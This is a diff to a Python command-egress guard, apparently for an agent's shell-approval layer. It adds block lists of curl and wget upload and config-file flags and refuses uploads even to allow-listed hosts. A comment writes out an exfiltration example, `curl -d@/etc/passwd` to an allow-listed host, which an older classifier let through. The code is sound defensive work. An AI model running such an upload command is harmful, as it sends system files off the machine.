@@ -323,6 +323,86 @@ _URL_HOST = re.compile(r"\b[a-zA-Z][a-zA-Z0-9+.\-]*://([^/\s'\"`?#]+)")
 
 _EGRESS_VERBS = ("curl", "wget")
 
+# Flags that turn a fetch into an upload (#222). #149 wrote down its own premise
+# -- "a `curl -X POST` is already mutating and already parks" -- and on
+# voitta-yolt 1.6.0 that premise is false in the worst direction: curl's rule
+# default was `safe` there, so `curl -d@/etc/passwd https://<allow-listed host>`
+# came back `safe`, and `safe` short-circuits to execute() without the grant
+# layer ever being consulted. Not "grant vouched for it": grant never saw it.
+# 2.0.0 moved the default to `ask`, so the exposure is exactly a deployment
+# running a classifier older than that -- which the version floor does not
+# prevent, because preflight only warns.
+#
+# So this stops depending on the classifier having caught them. A request body
+# is an upload; "read-only" in #149's sense is about this machine, and the host
+# being allow-listed says where bytes may go, not that bytes may go.
+_BODY_FLAGS_LONG = (
+    "--data", "--data-raw", "--data-binary", "--data-urlencode", "--data-ascii",
+    "--json", "--form", "--form-string", "--upload-file", "--request",
+    # wget's spellings
+    "--post-data", "--post-file", "--body-data", "--body-file", "--method",
+)
+# ...and the short forms, which is where the care goes. In a short-option
+# cluster every character is an option letter, so `-sXPOST` and `-d@f` are the
+# same option as `-X POST` and `-d @f` -- that is the bug voitta-yolt#156 fixed
+# upstream, and repeating it here would reopen this hole one spelling over.
+# Case matters: `-d` is data but `-D` dumps headers, `-F` is form but `-f` is
+# fail, `-T` uploads but `-t` does not, `-X` sets the method but `-x` is a proxy.
+# Ordinary curl is unaffected -- `-sSfL`, `-fsSL`, `-I`, `-o`, `-v` contain none
+# of these four letters.
+#
+# Per verb, because the same letters mean different things. wget spells every
+# body option long (`--post-data`, `--body-file`), and its short flags collide
+# head-on: `-d` is debug, `-T` is a timeout, `-F` is --force-html. Carrying
+# curl's letters across would card ordinary wget use for nothing.
+_BODY_LETTERS = {"curl": frozenset("dFTX"), "wget": frozenset()}
+
+# Options that source further options or URLs from a file, which this layer
+# cannot read -- so what the command does is not what the command says.
+# Measured: a config file containing `data = "@/tmp/x"` makes curl POST that
+# file, and curl itself prints "POST is already inferred" while the argv scan
+# sees only `-K`. Same for a destination: an `output` line took effect from a
+# file that never appeared in argv.
+#
+# `-i` is the reason this is per-verb too: wget's reads a URL list, curl's is
+# --include and is everywhere. Getting that backwards would card every
+# `curl -i` on the box.
+_INDIRECT_LONG = ("--config", "--input-file")
+_INDIRECT_LETTERS = {"curl": frozenset("K"), "wget": frozenset("i")}
+
+
+def _long_hit(token, names):
+    retval = token in names or any(token.startswith(n + "=") for n in names)
+    return retval
+
+
+def _upload_reason(verb, tokens):
+    """Why this fetch is not read-only, or None.
+
+    Refuses on the letter rather than pairing it with its value. Deciding which
+    letter in a cluster consumes what is precisely the reasoning that produced
+    the upstream matcher bug, and the cost of not doing it is one approval card
+    for `curl -X GET`, an unusual spelling of a thing that needs no body."""
+    body = _BODY_LETTERS.get(verb, frozenset())
+    indirect = _INDIRECT_LETTERS.get(verb, frozenset())
+    retval = None
+    for t in tokens:
+        if _long_hit(t, _BODY_FLAGS_LONG):
+            retval = "fetch carries a request body (upload), so it is not read-only"
+            break
+        if _long_hit(t, _INDIRECT_LONG):
+            retval = f"fetch takes options or URLs from a file ({t}), so what it does is not visible here"
+            break
+        if t.startswith("-") and not t.startswith("--"):
+            letters = set(t[1:])
+            if letters & body:
+                retval = "fetch carries a request body (upload), so it is not read-only"
+                break
+            if letters & indirect:
+                retval = f"fetch takes options or URLs from a file ({t}), so what it does is not visible here"
+                break
+    return retval
+
 # git talks to a remote over https without any of the above (#149 review). Only
 # these subcommands do: `git log --grep https://x` names a URL and contacts
 # nothing, and carding it would be a guard inventing work.
@@ -393,6 +473,18 @@ def check_egress(command, policy):
         fetches = _git_subcommand(tokens) in _GIT_NET_SUBS
     if not fetches:
         return (True, "")
+    # Before the host check, and deliberately not subject to it: an allow-listed
+    # host says where bytes may go, not that bytes may go (#222). Scanned from
+    # the first fetch verb so a body-shaped flag belonging to an earlier command
+    # in a chain -- `grep -d skip x && curl https://ok` -- does not card the
+    # fetch. Over-matching past that point is left alone: it costs a card, which
+    # is the direction this is allowed to be wrong in.
+    _first = next((i for i, t in enumerate(tokens)
+                   if os.path.basename(t) in _EGRESS_VERBS), None)
+    if _first is not None:
+        _why = _upload_reason(os.path.basename(tokens[_first]), tokens[_first + 1:])
+        if _why:
+            return (False, _why)
     hosts = [_host_of(h) for h in _URL_HOST.findall(command)]
     if not hosts:
         return (False, "fetch: no statically known host (use an explicit https:// URL)")
